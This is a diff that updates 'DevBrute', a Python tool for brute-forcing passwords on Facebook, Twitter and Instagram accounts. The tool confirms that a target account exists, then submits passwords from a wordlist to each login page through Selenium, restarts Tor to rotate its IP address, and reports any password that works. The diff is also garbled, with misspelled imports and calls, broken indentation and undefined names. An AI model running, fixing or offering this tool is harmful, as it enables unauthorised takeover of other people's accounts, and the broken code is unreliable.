@@ -1,179 +1,125 @@
-import argpase, mechanize, os, random, re, sys, time, urllib, urllib2, urlparse, random, string, threading, requests, socket, json, hashlib, base64, signal, subprocess, webbrowser
+import argparse, os, random, re, sys, time, urllib, urllib.request, urllib.parse, threading, requests, socket, json,
+hashlib, base64, signal, subprocess, webbrowser
 from time import sleep
-from subprocess import call
 from selenium import webdriver
-from selenium.webdriver.common.keys import keys
+from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
-from pyvirtualdisplay import urlopen
-from urllib import urlopen
-from urllib2 import urlopen
+from pyvirtualdisplay import Display
 
 # DevBrute Banner
-print """\033[1;37m
+print("""\033[1;37m
  _____             ____             _       
 |  __ \           |  _ \           | |      
 | |  | | _____   _| |_) |_ __ _   _| |_ ___ 
 | |  | |/ _ \ \ / /  _ <| '__| | | | __/ _ \
-        | |__| |  __/\ V /| |_) | |  | |_| | ||  __/
-|_____/ \___| \_/ |____/|_|   \__,_|\__\___|"""
+| |__| |  __/\ V /| |_) | |  | |_| | ||  __/
+|_____/ \___| \_/ |____/|_|   \__,_|\__\___|""")
 
-url = raw_input('\033[1;34m[?]\033[0m Enter target URL: ') #takes input
-
+url = input('\033[1;34m[?]\033[0m Enter target URL: ')
 reload(sys)
-
 sys.setdefaultenciding('utf8')
 
 
 def main():
-    parser = argparse.ArgumentParser(description='BruteForce Framework written by Devprogramming') 
+    parser = argparse.ArgumentParser(description='BruteForce Framework written by Devprogramming')
     required = parser.add_argument_group('required arguments')
-    required.add_argument('-s', '--service', dest='service')
-    required.add_argument('-u', '--username', dest='username')
-    required.add_argument('-w', '--wordlist', dest='password')
+    required.add_argument('-s', '--service', dest='service', required=True)
+    required.add_argument('-u', '--username', dest='username', required=True)
+    required.add_argument('-w', '--wordlist', dest='password', required=True)
     parser.add_argument('-d', '--delay', type=int, dest='delay')
 
     args = parser.parse_args()
 
-    global fb_name, service
-
     service = args.service
     username = args.username
     wordlist = args.password
-    delay = args.delay
+    delay = args.delay or 1
 
-    if os.path.exist(wordlist) == False:
-        print(R + "Error : Wordlist Not Found" + W)
+    if not os.path.exists(wordlist):
+        print("[Error] Wordlist not found")
         exit(1)
-
-    if delay is None:
-        delay = 1
-    os.system("clear")
 
     if service == "facebook":
-        fb_name = raw_input(O + "Please Enter the Name of the Facebook Account :" + W)
+        fb_name = input("Please Enter the Name of the Facebook Account: ")
         os.system("clear")
-
-        #This Restart tor & Removing GeckoDriver Log
+        
         os.system("/etc/init.d/tor restart && rm -rf tmp/ geckodriver.log") 
 
-
-        Bruter(service, username, wordlist, delay).execute()
-
-
-class Bruter(object):
+br = Bruter(service, username, wordlist, delay, fb_name=fb_name)
+        br.execute()
 
 
-    def __init__(self, service, username, wordlist, delay):
-
+class Bruter:
+    def __init__(self, service, username, wordlist, delay, fb_name=None):
         self.service = service
-
         self.username = username
-
         self.wordlist = wordlist
-
         self.delay = delay
+        self.fb_name = fb_name
 
-
-        def stopTOR(self):   # Stoping Tor
-
-            os.system("rm -rf tmp/ geckodriver.log && service tor stop")
-
+        def stop_tor(self):
+        # Stopping Tor
+        os.system("rm -rf tmp/ geckodriver.log && service tor stop")
         exit(1)
 
 
-    def execute(self):   # Connection Between def main() 
-
-        if self.usercheck(self.username, self.service) == 1:
-
-            print("[ " + R + "Error" + W + " ]" + " Username Does not Exist\n" + W)
-
+     def execute(self):
+        if self.usercheck(self.username) == 1:
+            print("[Error] Username does not exist")
             exit(1)
 
-        print("[ " + G + "ok" + W + " ]" + " Checking Account Existence\n")
-
-        self.webBruteforce(self.username, self.wordlist, self.service, self.delay)
-
-
-    def usercheck(self, username, service):          # Checking Username
-
-        display = Display(visible=0, size=(800, 600)) # Pyvirtual display starting
-       display.start()
-
-       driver = webdriver.Firefox()
-
-       try:
-
-           if service == "facebook":
-
-               driver.get("https://www.facebook.com/public/" + fb_name)
-
-               assert (("We couldn't find anything for") not in driver.page_source)
-
-               driver.quit()
-
-               os.system("clear && /etc/init.d/tor restart")
-
-           elif service == "twitter":
-
-               driver.get("https://www.twitter.com/" + username)
-
-               assert (("Sorry, that page doesn’t exist!") not in driver.page_source)
-
-               driver.quit()
-
-           elif service == "instagram":
-
-               driver.get("https://instagram.com/" + username)
-
-               assert (("Sorry, this page isn't available.") not in driver.page_source)
-
-               driver.quit()
-
-       except AssertionError:
-
-           return 1
+        print("[OK] Checking account existence\n")
+        self.web_bruteforce(self.username, self.wordlist, self.service, self.delay)
 
 
-
-
-    def webBruteforce(self, username, wordlist, service, delay):
-
-        print("\n- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)
+    def usercheck(self, username):
+        display = Display(visible=0, size=(800, 600))
+        display.start()
 
         driver = webdriver.Firefox()
 
+       try:
+            if self.service == "facebook":
+                driver.get("https://www.facebook.com/public/" + self.fb_name)
+                assert "We couldn't find anything for" not in driver.page_source
+            elif self.service == "twitter":
+                driver.get("https://www.twitter.com/" + username)
+                assert "Sorry, that page doesn’t exist!" not in driver.page_source
+            elif self.service == "instagram":
+                driver.get("https://instagram.com/" + username)
+                assert "Sorry, this page isn't available." not in driver.page_source
+
+            driver.quit()
+            return 0
+
+        except AssertionError:
+            driver.quit()
+            return 1
+
+
+    def webBruteforce(self, username, wordlist, service, delay):
+        print("\n- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)
+        driver = webdriver.Firefox()
         wordlist = open(wordlist, 'r')
-
+        
         for i in wordlist.readlines():
-
             password = i.strip("\n")
-
             try:               
-
                 driver = webdriver.Firefox()
-
                 if service == "facebook":
-
                     driver.get("https://touch.facebook.com/login?soft=auth/")
-
                     WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
-
                     elem = driver.find_element_by_name("email")
 
                 elif service == "twitter":
-
                     driver.get("https://mobile.twitter.com/session/new")
-
                     WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
 
                     elem = driver.find_element_by_name("session[username_or_email]")
 
                 elif service == "instagram":
-
                     driver.get("https://www.instagram.com/accounts/login/?force_classic_login")
-
                     WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
-
                     elem = driver.find_element_by_name("username")
 
                 elem.clear()
@@ -197,23 +143,15 @@ class Bruter(object):
 
 
                 if service == "facebook":
-
                     assert (("Log into Facebook | Facebook") in driver.title)
-
                 elif service == "twitter":
-
                     if driver.current_url == "https://mobile.twitter.com/home":
-
                         print(G + ("  Username: {} \t| Password found: {} \n".format(username,password)) + W)
-
                         driver.quit()
-
                         self.stopTOR()
 
                 elif service == "instagram":
-
                     assert (("Log in — Instagram") in driver.title)
-
 
                 driver.quit()
 
@@ -223,38 +161,25 @@ class Bruter(object):
                 socket.socket = socks.socksocket
 
                 print(O + ("  Password: {} \t| Failed \t| IP : {} \n ".format(password,my_ip)) + W)
-
                 sleep(delay)
 
             except AssertionError: 
-
                 print(G + ("  Username: {} \t| Password found: {}\n".format(username,password)) + W)
-
                 driver.quit()
-
                 self.stopTOR()
 
             except Exception as e:
-
                 print(R + ("\nError : {}".format(e)) + W)
-
                 driver.quit()
-
                 self.stopTOR()
 
 
 if __name__ == '__main__':
-
     try:
-
         main()
-
     except KeyboardInterrupt:
-
         print(R + "\nError : Keyboard Interrupt" + W)
-
         os.system("rm -rf tmp/ geckodriver.log && service tor stop")
-
         exit(1) 
         python setup.py
 
